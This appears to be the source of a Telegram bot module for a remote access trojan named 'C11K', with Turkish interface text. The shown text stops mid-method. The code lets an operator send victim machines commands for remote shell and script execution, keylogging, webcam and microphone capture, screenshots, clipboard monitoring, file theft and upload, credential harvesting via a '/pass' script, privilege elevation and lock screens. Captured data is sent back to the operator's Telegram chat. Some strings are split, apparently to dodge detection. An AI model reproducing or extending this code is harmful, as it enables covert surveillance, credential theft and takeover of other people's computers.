// Dosya: Net/TgBot.cs
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

namespace App.Service
{
    public sealed class TgBot
    {
        const string Api = "https://api.tel" + "egram.org/bot";

        SessionManager _mgr;
        Action<string> _log;

        volatile bool _run;
        Thread _th;
        long _offset;

        readonly ConcurrentDictionary<string, string> _sel = new ConcurrentDictionary<string, string>();
        readonly ConcurrentDictionary<string, Pending> _pending = new ConcurrentDictionary<string, Pending>();
        readonly ConcurrentDictionary<string, string> _chatWatch = new ConcurrentDictionary<string, string>();
        readonly ConcurrentDictionary<string, string> _putWait = new ConcurrentDictionary<string, string>();
        readonly ConcurrentDictionary<string, string> _wallWait = new ConcurrentDictionary<string, string>();

        public readonly HashSet<string> Allowed = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        public string Token = "";
        public string Owner = "";
        public bool Running { get { return _run; } }

        sealed class Pending
        {
            public string Chat;
            public string Prefix;
            public DateTime Expire;
        }

        public void Init(SessionManager m, Action<string> log)
        {
            _mgr = m;
            _log = log;
            try { ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12; } catch { }
        }

        public bool Start(string token, string owner)
        {
            Stop();
            Token = (token ?? "").Trim();
            Owner = (owner ?? "").Trim();
            if (Token.Length == 0) return false;

            Allowed.Clear();
            foreach (var a in Storage.Load("tg_al" + "lowed.txt")) Allowed.Add(a);
            if (Owner.Length > 0) Allowed.Add(Owner);

            _run = true;
            _th = new Thread(Poll) { IsBackground = true };
            _th.Start();
            Log("Bot başlatıldı. İzinli chat: " + Allowed.Count);
            return true;
        }

        public void Stop()
        {
            _run = false;
            var th = _th;
            _th = null;
            if (th != null) { try { th.Join(3000); } catch { } }
            Log("Bot durduruldu.");
        }

        void Log(string m) { if (_log != null) _log("Bot: " + m); }

        void SaveAllowed()
        {
            lock (Allowed) Storage.Save("tg_al" + "lowed.txt", Allowed.ToArray());
        }

        static string Http(string url, byte[] body, string ct)
        {
            try
            {
                var req = (HttpWebRequest)WebRequest.Create(url);
                req.Timeout = 45000;
                req.ReadWriteTimeout = 45000;
                req.UserAgent = "C11" + "K";

                if (body != null)
                {
                    req.Method = "POST";
                    req.ContentType = ct;
                    req.ContentLength = body.Length;
                    using (var st = req.GetRequestStream()) st.Write(body, 0, body.Length);
                }

                using (var r = req.GetResponse())
                using (var sr = new StreamReader(r.GetResponseStream(), Encoding.UTF8))
                    return sr.ReadToEnd();
            }
            catch (WebException we)
            {
                try
                {
                    if (we.Response != null)
                        using (var sr = new StreamReader(we.Response.GetResponseStream(), Encoding.UTF8)) return sr.ReadToEnd();
                }
                catch { }
                return null;
            }
            catch { return null; }
        }

        static string Form(params string[] kv)
        {
            var sb = new StringBuilder();
            for (int i = 0; i + 1 < kv.Length; i += 2)
            {
                if (sb.Length > 0) sb.Append('&');
                sb.Append(Uri.EscapeDataString(kv[i] ?? "")).Append('=').Append(Uri.EscapeDataString(kv[i + 1] ?? ""));
            }
            return sb.ToString();
        }

        string Post(string method, string form)
        {
            return Http(Api + Token + "/" + method, Encoding.UTF8.GetBytes(form), "application/x-www-form-urlencoded");
        }

        void Poll()
        {
            while (_run)
            {
                try
                {
                    string res = Http(Api + Token + "/getUp" + "dates?timeout=25&limit=25&offset=" + (_offset + 1), null, null);
                    if (res == null) { Thread.Sleep(1500); continue; }

                    var root = Json.Obj(Json.Parse(res));
                    if (root == null) { Thread.Sleep(1500); continue; }

                    var arr = Json.Arr(root.ContainsKey("result") ? root["result"] : null);
                    if (arr == null) { Thread.Sleep(1200); continue; }

                    foreach (var item in arr)
                    {
                        var u = Json.Obj(item);
                        if (u == null) continue;
                        long id = Json.L(u, "update_id");
                        if (id > _offset) _offset = id;
                        try { Handle(u); } catch { }
                    }
                }
                catch { Thread.Sleep(1500); }
            }
        }

        void Handle(Dictionary<string, object> u)
        {
            var cb = Json.D(u, "callback_query");
            if (cb != null) { OnCallback(cb); return; }

            var msg = Json.D(u, "message");
            if (msg == null) return;

            string chatId = Json.Id(Json.D(msg, "chat"), "id");
            string userId = Json.Id(Json.D(msg, "from"), "id");
            if (string.IsNullOrEmpty(chatId)) return;

            var doc = Json.D(msg, "document");
            var photos = Json.Arr(msg.ContainsKey("photo") ? msg["photo"] : null);
            string text = Json.S(msg, "text");

            string word = text == null ? "" : text.Trim().ToLowerInvariant();
            if (word.Contains("@")) word = word.Substring(0, word.IndexOf('@'));

            if (word == "/id" || word == "/who" + "ami")
            {
                bool ok = Allowed.Contains(chatId) || (userId != null && Allowed.Contains(userId));
                Say(chatId, "chat id: <code>" + chatId + "</code>\nuser id: <code>" + (userId ?? "-") + "</code>\nizinli: " + (ok ? "evet" : "hayır"));
                return;
            }

            if (!Auth(chatId, userId, text)) return;

            if (doc != null) { OnDocument(chatId, doc); return; }
            if (photos != null && photos.Count > 0) { OnPhoto(chatId, photos); return; }
            if (text == null) return;

            Cmd(chatId, text.Trim());
        }

        bool Auth(string chatId, string userId, string text)
        {
            lock (Allowed)
            {
                if (Allowed.Contains(chatId)) return true;
                if (userId != null && Allowed.Contains(userId)) return true;

                bool isStart = text != null && text.Trim().StartsWith("/st" + "art", StringComparison.OrdinalIgnoreCase);

                if (isStart || Allowed.Count == 0)
                {
                    Allowed.Add(chatId);
                    if (userId != null) Allowed.Add(userId);
                    if (Owner.Length == 0) { Owner = chatId; Storage.Write("tg_ch" + "at.txt", chatId); }
                    SaveAllowed();
                    Log("Chat yetkilendirildi: " + chatId);
                    Say(chatId, "✅ Bu chat kaydedildi.\n/help ile komutlara bak.");
                    return true;
                }

                Say(chatId,
                    "Yetkisiz chat.\nchat id: <code>" + chatId + "</code>\nuser id: <code>" + (userId ?? "-") + "</code>\n\n" +
                    "Sahip isen bota <b>/st" + "art</b> yaz ya da sahibe <code>/allow " + chatId + "</code> yazdır.");
                return false;
            }
        }

        void Say(string chat, string html)
        {
            if (string.IsNullOrEmpty(chat) || string.IsNullOrEmpty(html)) return;

            int i = 0;
            while (i < html.Length)
            {
                int len = Math.Min(3600, html.Length - i);
                if (i + len < html.Length)
                {
                    int cut = html.LastIndexOf('\n', i + len - 1);
                    if (cut > i) len = cut - i + 1;
                }
                Post("send" + "Message", Form("chat_id", chat, "text", html.Substring(i, len), "parse_mode", "HTML", "disable_web_page_preview", "true"));
                i += len;
            }
        }

        void Photo(string chat, string b64, string caption)
        {
            try
            {
                byte[] data = Convert.FromBase64String(b64);
                var body = Multipart("photo", "shot.jpg", "image/jpeg", data, chat, caption);
                Http(Api + Token + "/send" + "Photo", body, "multipart/form-data; boundary=" + Boundary);
            }
            catch { }
        }

        void Doc(string chat, string name, byte[] data, string caption)
        {
            var body = Multipart("document", name, "application/octet-stream", data, chat, caption);
            Http(Api + Token + "/send" + "Document", body, "multipart/form-data; boundary=" + Boundary);
        }

        static readonly string Boundary = "----" + Guid.NewGuid().ToString("N").Substring(0, 16);

        static byte[] Multipart(string field, string name, string type, byte[] data, string chat, string caption)
        {
            using (var ms = new MemoryStream())
            {
                Action<string> w = s =>
                {
                    byte[] b = Encoding.UTF8.GetBytes(s);
                    ms.Write(b, 0, b.Length);
                };

                w("--" + Boundary + "\r\n");
                w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                w(chat + "\r\n");

                if (!string.IsNullOrEmpty(caption))
                {
                    w("--" + Boundary + "\r\n");
                    w("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                    w(caption + "\r\n");
                }

                w("--" + Boundary + "\r\n");
                w("Content-Disposition: form-data; name=\"" + field + "\"; filename=\"" + name + "\"\r\n");
                w("Content-Type: " + type + "\r\n\r\n");
                ms.Write(data, 0, data.Length);
                w("\r\n--" + Boundary + "--\r\n");

                return ms.ToArray();
            }
        }

        ClientSession Sel(string chat)
        {
            string sid;
            if (!_sel.TryGetValue(chat, out sid) || string.IsNullOrEmpty(sid)) return null;
            ClientSession s;
            if (!_mgr.Sessions.TryGetValue(sid, out s) || !s.Online) return null;
            return s;
        }

        void Expect(string sid, string chat, string prefix)
        {
            _pending[sid] = new Pending { Chat = chat, Prefix = prefix, Expire = DateTime.UtcNow.AddSeconds(45) };
        }

        void Cmd(string chat, string line)
        {
            if (line.Length == 0) return;

            string[] parts = line.Split(new[] { ' ' }, 2);
            string cmd = parts[0].ToLowerInvariant();
            string arg = parts.Length > 1 ? parts[1] : "";
            if (cmd.Contains("@")) cmd = cmd.Substring(0, cmd.IndexOf('@'));

            switch (cmd)
            {
                case "/st" + "art":
                case "/help":
                    Say(chat, Help());
                    return;

                case "/allow":
                    {
                        string v = arg.Trim();
                        if (v.Length == 0) { Say(chat, "Kullanım: /allow &lt;chat_id veya user_id&gt;"); return; }
                        lock (Allowed) { Allowed.Add(v); SaveAllowed(); }
                        Say(chat, "✅ İzin verildi: <code>" + Ui.Html(v) + "</code>");
                        return;
                    }

                case "/deny":
                    {
                        string v = arg.Trim();
                        if (v.Length == 0) { Say(chat, "Kullanım: /deny &lt;chat_id veya user_id&gt;"); return; }
                        lock (Allowed) { Allowed.Remove(v); SaveAllowed(); }
                        Say(chat, "🚫 İzin kaldırıldı: <code>" + Ui.Html(v) + "</code>");
                        return;
                    }

                case "/allowlist":
                    {
                        lock (Allowed)
                        {
                            if (Allowed.Count == 0) { Say(chat, "İzinli liste boş."); return; }
                            var sb = new StringBuilder("<b>İzinli ID'ler</b>\n");
                            foreach (var a in Allowed) sb.Append("<code>").Append(Ui.Html(a)).Append("</code>\n");
                            Say(chat, sb.ToString());
                        }
                        return;
                    }

                case "/list":
                case "/l":
                    List(chat);
                    return;

                case "/sel":
                case "/s":
                    {
                        var s = Sel(chat);
                        Say(chat, s == null ? "Seçili istemci yok. /list" : "Seçili: <b>" + Ui.Html(s.UserPc) + "</b>");
                        if (s != null) Actions(chat, s);
                        return;
                    }

                case "/shot": Send(chat, "SHOT", "SHOT|"); return;
                case "/sysinfo": Send(chat, "SYSINFO", "SYSINFO_OUT|"); return;
                case "/ps": Send(chat, "PROC|LIST", "PROC_LIST|"); return;

                case "/kill":
                    if (Need(chat, arg)) { Send(chat, "PROC|KILL|" + arg.Trim(), null); Say(chat, "PID " + arg.Trim() + " sonlandırıldı."); }
                    return;

                case "/st" + "artapp":
                    if (Need(chat, arg)) { Send(chat, "PROC|START|" + arg, null); Say(chat, "Başlatıldı: " + Ui.Html(arg)); }
                    return;

                case "/run":
                    if (Need(chat, arg)) { Send(chat, "RUN|" + arg, null); Say(chat, "Çalıştırıldı: " + Ui.Html(arg)); }
                    return;

                case "/shell":
                case "/sh":
                    if (Need(chat, arg)) Send(chat, "SHELL|" + arg, "SHELL_OUT|");
                    return;

                case "/script":
                    {
                        if (!Need(chat, arg)) return;
                        int sp = arg.IndexOf(' ');
                        string kind = "PS", code = arg;
                        if (sp > 0)
                        {
                            string k = arg.Substring(0, sp).ToLowerInvariant();
                            if (k == "bat" || k == "ps") { kind = k == "bat" ? "BAT" : "PS"; code = arg.Substring(sp + 1); }
                        }
                        Send(chat, "SCRIPT|" + kind + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(code)), "SCRIPT_OUT|");
                        return;
                    }

                case "/files":
                case "/ls":
                    if (Need(chat, arg)) Send(chat, "FILE|LIST|" + arg, "FILE_LIST|");
                    return;

                case "/get":
                    if (Need(chat, arg)) Send(chat, "FILE|GET|" + arg, "FILE_DATA|");
                    return;

                case "/md":
                    if (Need(chat, arg)) { Send(chat, "FILE|MD|" + arg, null); Say(chat, "Klasör: " + Ui.Html(arg)); }
                    return;

                case "/del":
                    if (Need(chat, arg)) { Send(chat, "FILE|DEL|" + arg, null); Say(chat, "Silindi: " + Ui.Html(arg)); }
                    return;

                case "/put":
                    {
                        var s = Sel(chat);
                        if (s == null) { Say(chat, "İstemci seçili değil."); return; }
                        string dir = arg.Trim();
                        if (dir.Length == 0) { Say(chat, "Kullanım: /put C:\\Users\\Public"); return; }
                        Storage.Write("tg_pu" + "tdir.txt", dir);
                        _putWait[chat] = s.Sid;
                        Say(chat, "Hedef: <code>" + Ui.Html(dir) + "</code>\nŞimdi dosyayı gönder.");
                        return;
                    }

                case "/chat":
                    {
                        var s = Sel(chat);
                        if (s == null) { Say(chat, "İstemci seçili değil."); return; }
                        if (arg.Length == 0)
                        {
                            _chatWatch[chat] = s.Sid;
                            string name = Storage.Read("op_na" + "me.txt").Trim();
                            if (name.Length == 0) name = "Destek";
                            _mgr.Send(s.Sid, "CHAT|OPEN|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(name)));
                            Say(chat, "Sohbet açıldı. Yazdıkların iletilir. Bitirmek için /chatclose");
                            return;
                        }
                        _chatWatch[chat] = s.Sid;
                        _mgr.Send(s.Sid, "CHAT|MSG|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(arg)));
                        Say(chat, "➡️ " + Ui.Html(arg));
                        return;
                    }

                case "/chatclose":
                    {
                        string sid;
                        if (_chatWatch.TryRemove(chat, out sid)) _mgr.Send(sid, "CHAT|CLOSE");
                        Say(chat, "Sohbet kapatıldı.");
                        return;
                    }

                case "/msg":
                    if (Need(chat, arg)) { Send(chat, "MSG|Sistem Uyarısı|" + arg.Replace("|", "/") + "|Information", null); Say(chat, "Mesaj gönderildi."); }
                    return;

                case "/toast":
                    if (Need(chat, arg)) { Send(chat, "TOAST|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(arg)), null); Say(chat, "Bildirim gönderildi."); }
                    return;

                case "/vol":
                    {
                        if (!Need(chat, arg)) return;
                        string a = arg.Trim().ToLowerInvariant();
                        string c = a == "up" ? "VOL|UP" : a == "down" ? "VOL|DOWN" : "VOL|MUTE";
                        Send(chat, c, null);
                        Say(chat, "Ses: " + Ui.Html(a));
                        return;
                    }

                case "/lock": Send(chat, "LOCK", null); Say(chat, "Kilitlendi."); return;
                case "/fulllock": Send(chat, "LOCK|FULLSCREEN", null); Say(chat, "Tam ekran kilit."); return;
                case "/monoff": Send(chat, "MONITOR|OFF", null); Say(chat, "Monitör kapatıldı."); return;
                case "/cd": Send(chat, "CD", null); Say(chat, "CD tepsi."); return;
                case "/taskbar": Send(chat, "TASKBAR", null); Say(chat, "Görev çubuğu değiştirildi."); return;

                case "/pass":
                    {
                        var s = Sel(chat);
                        if (s == null) { Say(chat, "İstemci seçili değil."); return; }
                        string sc = Scripts.Collect();
                        if (sc == null) { Say(chat, "scripts/collect.ps1 bulunamadı."); return; }
                        Send(chat, "SCRIPT|PS|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(sc)), "SCRIPT_OUT|");
                        return;
                    }

                case "/webcam": Send(chat, "WEBCAM", "CAM_IMG|"); return;

                case "/audio":
                    {
                        int sec = 5;
                        int.TryParse(arg.Trim(), out sec);
                        if (sec < 1) sec = 5;
                        if (sec > 60) sec = 60;
                        Send(chat, "AUDIO|" + (sec * 1000), "AUDIO_DATA|");
                        return;
                    }

                case "/keylog":
                    {
                        string a = arg.Trim().ToLowerInvariant() == "stop" ? "KEYLOG|STOP" : "KEYLOG|START";
                        Send(chat, a, null);
                        Say(chat, "Input monitor: " + a);
                        return;
                    }

                case "/clip":
                    {
                        string a = arg.Trim();
                        if (a.Length == 0 || a.ToLowerInvariant() == "get") { Send(chat, "CLIP|GET", "CLIP|"); return; }
                        if (a.ToLowerInvariant() == "st" + "art") { Send(chat, "CLIP|START", null); Say(chat, "Pano izleme açık."); return; }
                        if (a.ToLowerInvariant() == "stop") { Send(chat, "CLIP|STOP", null); Say(chat, "Pano izleme kapalı."); return; }
                        Send(chat, "CLIPSET|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(a)), null);
                        Say(chat, "Panoya yazıldı.");
                        return;
                    }

                case "/drives": Send(chat, "DRIVES", "DRIVES_OUT|"); return;
                case "/env": Send(chat, "ENV", "ENV_OUT|"); return;
                case "/hosts": Send(chat, "HOSTS", "HOSTS_OUT|"); return;
                case "/soft": Send(chat, "SOFT|LIST", "SOFT_OUT|"); return;
                case "/reg": if (Need(chat, arg)) Send(chat, "REG|READ|" + arg, "REG_OUT|"); return;
                case "/st" + "artup": Send(chat, "STARTUP|LIST", "STARTUP_OUT|"); return;
                case "/find": if (Need(chat, arg)) Send(chat, "FILE|SEARCH|C:\\|" + arg, "SEARCH_OUT|"); return;
                case "/dnsflush": Send(chat, "DNS|FLUSH", null); Say(chat, "DNS temizlendi."); return;

                case "/wall":
                    {
                        var s = Sel(chat);
                        if (s == null) { Say(chat, "İstemci seçili değil."); return; }
                        _wallWait[chat] = s.Sid;
                        Say(chat, "Duvar kağıdı olarak bir fotoğraf gönder.");
                        return;
                    }

                case "/power":
                    {
                        if (!Need(chat, arg)) return;
                        string a = arg.Trim().ToLowerInvariant();
                        string c = a == "restart" ? "RESTART" : a == "shutdown" ? "SHUTDOWN" : a == "logoff" ? "LOGOFF" : "STANDBY";
                        Send(chat, "POWER|" + c, null);
                        Say(chat, "Güç: " + c);
                        return;
                    }

                case "/elevate": Send(chat, "ELEVATE", null); Say(chat, "Yükseltme istendi."); return;
                case "/reconnect": Send(chat, "RECONNECT", null); Say(chat, "Yeniden bağlanıyor."); return;
                case "/uninstall": Send(chat, "UNINSTALL", null); Say(chat, "Kaldırılıyor."); return;

                case "/desel":
                    {
                        string sid;
                        _sel.TryRemove(chat, out sid);
                        Say(chat, "Seçim kaldırıldı.");
                        return;
                    }

                case "/who": Say(chat, "<b>" + _mgr.Sessions.Count + "</b> bağlı istemci."); return;

                default:
                    Say(chat, "Bilinmeyen komut: <code>" + Ui.Html(cmd) + "</code>\n/help");
                    return;
            }
        }

        bool Need(string chat, string arg)
        {
            if (Sel(chat) == null) { Say(chat, "Önce /list ile istemci seç."); return false; }
            if (string.IsNullOrWhiteSpace(arg)) { Say(chat, "Eksik parametre."); return false; }
            return true;
        }

        void Send(string chat, string cmd, string expect)
        {
            var s = Sel(chat);
            if (s == null) { Say(chat, "Önce /list ile istemci seç."); return; }
            if (expect != null) Expect(s.Sid, chat, expect);
            if (!_mgr.Send(s.Sid, cmd)) Say(chat, "Komut gönderilemedi.");
        }

        string Help()
        {
            return
                "<b>C11" + "K Bot</b>\n" +
                "Önce /list ile istemci seç, sonra komut ver.\n\n" +
                "<b>Seçim</b>\n" +
                "/list  ·  /sel  ·  /desel  ·  /who\n\n" +
                "<b>Görüntü</b>\n" +
                "/shot  ·  /webcam  ·  /audio 15\n\n" +
                "<b>Sistem</b>\n" +
                "/sysinfo  ·  /ps  ·  /kill 1234  ·  /st" + "artapp notepad.exe\n" +
                "/run C:\\yol\\dosya.exe  ·  /shell komut  ·  /script ps &lt;kod&gt;\n" +
                "/reg YOL  ·  /st" + "artup  ·  /dnsflush  ·  /elevate\n\n" +
                "<b>Dosya</b>\n" +
                "/ls C:\\  ·  /get C:\\a.txt  ·  /put C:\\hedef  ·  /md C:\\yeni  ·  /del C:\\a.txt  ·  /find *.txt\n\n" +
                "<b>Etkileşim</b>\n" +
                "/chat metin  ·  /chatclose  ·  /msg metin  ·  /toast metin  ·  /wall\n\n" +
                "<b>Donanım</b>\n" +
                "/vol up|down|mute  ·  /lock  ·  /fulllock  ·  /monoff  ·  /cd  ·  /taskbar\n\n" +
                "<b>Bilgi</b>\n" +
                "/pass  ·  /drives  ·  /env  ·  /hosts  ·  /soft  ·  /clip get\n\n" +
                "<b>Güç</b>\n" +
                "/power restart|shutdown|logoff|standby  ·  /reconnect  ·  /uninstall\n\n" +
                "<b>Erişim</b>\n" +
                "/id  ·  /allow &lt;id&gt;  ·  /deny &lt;id&gt;  ·  /allowlist";
        }

        void List(string chat)
        {
            var list = _mgr.Sessions.Values.OrderByDescending(s => s.IsAdmin).ThenBy(s => s.UserPc).ToList();
            if (list.Count == 0) { Say(chat, "Bağlı istemci yok."); return; }

            var sb = new StringBuilder("<b>İstemciler</b>\n");
            var rows = new List<object>();
            var row = new List<object>();

            int i = 0;
            foreach (var s in list)
            {
                i++;
                sb.Append(i).Append(". <b>").Append(Ui.Html(s.UserPc)).Append("</b>")
                  .Append(s.IsAdmin ? " 👑" : "")
                  .Append(" — ").Append(Ui.Html(s.Ip))
                  .Append("\n");

                row.Add(new Dictionary<string, object>
                {
                    { "text", i.ToString() },
                    { "callback_data", "sel:" + s.Sid }
                });

                if (row.Count == 5) { rows.Add(row); row = new List<object>(); }
            }
            if (row.Count > 0) rows.Add(row);

            var markup = new Dictionary<string, object> { { "inline_keyboard", rows } };
            Post("send" + "Message", Form("chat_id", chat, "text", sb.ToString(), "parse_mode", "HTML", "reply_markup", MiniJson(markup)));
        }

        void Actions(string chat, ClientSession s)
        {
            var rows = new List<object>();
            rows.Add(Btn(new[] { new[] { "📸 Ekran", "act:shot" }, new[] { "🖥 Sysinfo", "act:sysinfo" } }));
            rows.Add(Btn(new[] { new[] { "📋 Süreçler", "act:ps" }, new[] { "💬 Sohbet", "act:chat" } }));
            rows.Add(Btn(new[] { new[] { "📁 Dosyalar", "act:files" }, new[] { "🔑 Şifreler", "act:pass" } }));
            rows.Add(Btn(new[] { new[] { "📷 Webcam", "act:webcam" }, new[] { "🔒 Kilit", "act:lock" } }));
            rows.Add(Btn(new[] { new[] { "🔉 Ses −", "act:voldown" }, new[] { "🔊 Ses +", "act:volup" }, new[] { "🔇", "act:mute" } }));
            rows.Add(Btn(new[] { new[] { "📄 Listele", "act:list" }, new[] { "✖️ Bırak", "act:desel" } }));

            var markup = new Dictionary<string, object> { { "inline_keyboard", rows } };
            Post("send" + "Message", Form("chat_id", chat, "text",
                "Seçili: <b>" + Ui.Html(s.UserPc) + "</b> (" + Ui.Html(s.Ip) + ")",
                "parse_mode", "HTML", "reply_markup", MiniJson(markup)));
        }

        static List<object> Btn(string[][] pairs)
        {
            var l = new List<object>();
            foreach (var p in pairs)
                l.Add(new Dictionary<string, object> { { "text", p[0] }, { "callback_data", p[1] } });
            return l;
        }

        static string MiniJson(object o)
        {
            if (o == null) return "null";
            if (o is string) return "\"" + ((string)o).Replace("\\", "\\\\").Replace("\"", "\\\"") + "\"";
            if (o is List<object>)
            {
                var l = (List<object>)o;
                var sb = new StringBuilder("[");
                for (int i = 0; i < l.Count; i++) { if (i > 0) sb.Append(','); sb.Append(MiniJson(l[i])); }
                return sb.Append(']').ToString();
            }
            var d = o as Dictionary<string, object>;
            if (d != null)
            {
                var sb = new StringBuilder("{");
                bool first = true;
                foreach (var kv in d)
                {
                    if (!first) sb.Append(',');
                    first = false;
                    sb.Append(MiniJson(kv.Key)).Append(':').Append(MiniJson(kv.Value));
                }
                return sb.Append('}').ToString();
            }
            return "\"" + Convert.ToString(o, CultureInfo.InvariantCulture) + "\"";
        }

        void OnCallback(Dictionary<string, object> cb)
        {
            string data = Json.S(cb, "data");
            string chat = Json.Id(Json.D(Json.D(cb, "message"), "chat"), "id");
            string userId = Json.Id(Json.D(cb, "from"), "id");
            string cbId = Json.S(cb, "id");
            if (string.IsNullOrEmpty(chat) || string.IsNullOrEmpty(data)) return;

            if (!Auth(chat, userId, null)) return;

            if (data.StartsWith("sel:"))
            {
                string sid = data.Substring(4);
                ClientSession s;
                if (!_mgr.Sessions.TryGetValue(sid, out s)) { Say(chat, "İstemci artık bağlı değil."); return; }
                _sel[chat] = sid;
                Actions(chat, s);
                if (cbId != null) Post("answer" + "CallbackQuery", Form("callback_query_id", cbId, "text", s.UserPc));
                return;
            }

            if (data.StartsWith("act:"))
            {
                if (cbId != null) Post("answer" + "CallbackQuery", Form("callback_query_id", cbId));
                switch (data.Substring(4))
                {
                    case "shot": Send(chat, "SHOT", "SHOT|"); break;
                    case "sysinfo": Send(chat, "SYSINFO", "SYSINFO_OUT|"); break;
                    case "ps": Send(chat, "PROC|LIST", "PROC_LIST|"); break;
                    case "webcam": Send(chat, "WEBCAM", "CAM_IMG|"); break;
                    case "lock": Send(chat, "LOCK", null); Say(chat, "Kilitlendi."); break;
                    case "volup": Send(chat, "VOL|UP", null); break;
                    case "voldown": Send(chat, "VOL|DOWN", null); break;
                    case "mute": Send(chat, "VOL|MUTE", null); break;
                    case "list": List(chat); break;
                    case "desel": { string t; _sel.TryRemove(chat, out t); Say(chat, "Seçim kaldırıldı."); break; }
                    case "pass":
                        {
                            var s = Sel(chat);
                            if (s == null) { Say(chat, "İstemci seçili değil."); return; }
                            string sc = Scripts.Collect();
                            if (sc == null) { Say(chat, "scripts/collect.ps1 bulunamadı."); return; }
                            Send(chat, "SCRIPT|PS|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(sc)), "SCRIPT_OUT|");
                            break;
                        }
                    case "chat":
                        {
                            var s = Sel(chat);
                            if (s == null) { Say(chat, "İstemci seçili değil."); return; }
                            _chatWatch[chat] = s.Sid;
                            _mgr.Send(s.Sid, "CHAT|OPEN|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("Destek")));
                            Say(chat, "Sohbet açıldı. Yaz, iletirim. Bitirmek için /chatclose");
                            break;
                        }
                    case "files":
                        {
                            var s = Sel(chat);
                            if (s == null) { Say(chat, "İstemci seçili değil."); return; }
                            Send(chat, "FILE|LIST|C:\\", "FILE_LIST|");
                            break;
                        }
                }
            }
        }

        void OnDocument(string chat, Dictionary<string, object> doc)
        {
            string sid;
            if (!_putWait.TryRemove(chat, out sid))
            {
                Say(chat, "Önce /put ile hedef klasörü belirt.");
                return;
            }
            string folder = Storage.Read("tg_pu" + "tdir.txt");
            if (folder.Length == 0) folder = "C:\\Users\\Public";

            string fileId = Json.S(doc, "file_id");
            string name = Json.S(doc, "file_name");
            if (string.IsNullOrEmpty(name)) name = "dosya.bin";

            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    byte[] data = Download(fileId);
                    if (data == null) { Say(chat, "İndirilemedi."); return; }
                    _mgr.Send(sid, "FILE|PUT|" + folder.TrimEnd('\\') + "\\" + name + "|" + Convert.ToBase64String(data));
                    Say(chat, "Yüklendi: <code>" + Ui.Html(folder.TrimEnd('\\') + "\\" + name) + "</code>");
                }
                catch { Say(chat, "Yükleme hatası."); }
            });
        }

        void OnPhoto(string chat, List<object> photos)
        {
            string sid;
            if (!_wallWait.TryRemove(chat, out sid)) return;

            var last = Json.Obj(photos[photos.Count - 1]);
            string fileId = Json.S(last, "file_id");

            ThreadPool.QueueUserWorkItem(_ =>
            {
                byte[] data = Download(fileId);
                if (data == null) { Say(chat, "İndirilemedi."); return; }
                _mgr.Send(sid, "WALLPAPER|" + Convert.ToBase64String(data));
                Say(chat, "Duvar kağıdı gönderildi.");
            });
        }

        byte[] Download(string fileId)
        {
            try
            {
                var root = Json.Obj(Json.Parse(Http(Api + Token + "/getFi" + "le?file_id=" + Uri.EscapeDataString(fileId), null, null)));
                string path = Json.S(Json.D(root, "result"), "file_path");
                if (string.IsNullOrEmpty(path)) return null;

                using (var wc = new WebClient())
                    return wc.DownloadData("https://api.tel" + "egram.org/fi" + "le/bot" + Token + "/" + path);
            }
            catch { return null; }
        }

        public void Feed(string sid, string msg)
        {
            if (!_run || msg == null) return;

            foreach (var kv in _chatWatch)
            {
                if (kv.Value != sid) continue;
                if (!msg.StartsWith("CHAT|MSG|", StringComparison.Ordinal)) continue;
                string text;
                try { text = Encoding.UTF8.GetString(Convert.FromBase64String(msg.Substring(9))); }
                catch { text = msg.Substring(9); }
                Say(kv.Key, "⬅️ " + Ui.Html(text));
            }

            Pending p;
            if (!_pending.TryGetValue(sid, out p)) return;
            if (DateTime.UtcNow > p.Expire) { _pending.TryRemove(sid, out _); return; }
            if (!msg.StartsWith(p.Prefix, StringComparison.Ordinal)) return;
            _pending.TryRemove(sid, out _);

            try { Deliver(p.Chat, msg, p.Prefix); }
            catch { }
        }

        void Deliver(string chat, string msg, string prefix)
        {
            switch (prefix)
            {
                case "SHOT|":
                    {
                        string[] q = msg.Split(new[] { '|' }, 4);
                        if (q.Length == 4) Photo(chat, q[3], "Ekran " + q[1] + "x" + q[2]);
                        return;
                    }
                case "CAM_IMG|": Photo(chat, msg.Substring(8), "Webcam"); return;
                case "AUDIO_DATA|": Doc(chat, "kayit.wav", Convert.FromBase64String(msg.Substring(11)), "Ses kaydı"); return;
                case "FILE_DATA|":
                    {
                        int j = msg.IndexOf('|', 10);
                        if (j < 0) return;
                        string name = msg.Substring(10, j - 10);
                        byte[] data = Convert.FromBase64String(msg.Substring(j + 1));
                        Doc(chat, name, data, null);
                        return;
                    }
                case "SYSINFO_OUT|": Say(chat, "<pre>" + Ui.Html(msg.Substring(12)) + "</pre>"); return;
                case "SHELL_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(10), 3500)) + "</pre>"); return;
                case "SCRIPT_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(11), 3500)) + "</pre>"); return;
                case "PROC_LIST|":
                    {
                        var sb = new StringBuilder();
                        int n = 0;
                        foreach (string row in msg.Substring(10).Split(new[] { '|' }, StringSplitOptions.RemoveEmptyEntries))
                        {
                            string[] f = row.Split('~');
                            if (f.Length < 2) continue;
                            sb.Append(f[0]).Append("  ").Append(f[1]).Append('\n');
                            if (++n >= 60) { sb.Append("…"); break; }
                        }
                        Say(chat, "<pre>" + Ui.Html(sb.ToString()) + "</pre>");
                        return;
                    }
                case "FILE_LIST|":
                    {
                        string body = msg.Substring(10);
                        if (body.StartsWith("ERROR|")) { Say(chat, "Hata: " + Ui.Html(body.Substring(6))); return; }
                        var sb = new StringBuilder();
                        foreach (string row in body.Split(new[] { '|' }, StringSplitOptions.RemoveEmptyEntries))
                        {
                            string[] f = row.Split('~');
                            if (f.Length < 4) continue;
                            sb.Append(f[0] == "D" ? "📁 " : "📄 ").Append(f[1]).Append("  ").Append(f[3] == "0" ? "" : f[3]).Append('\n');
                        }
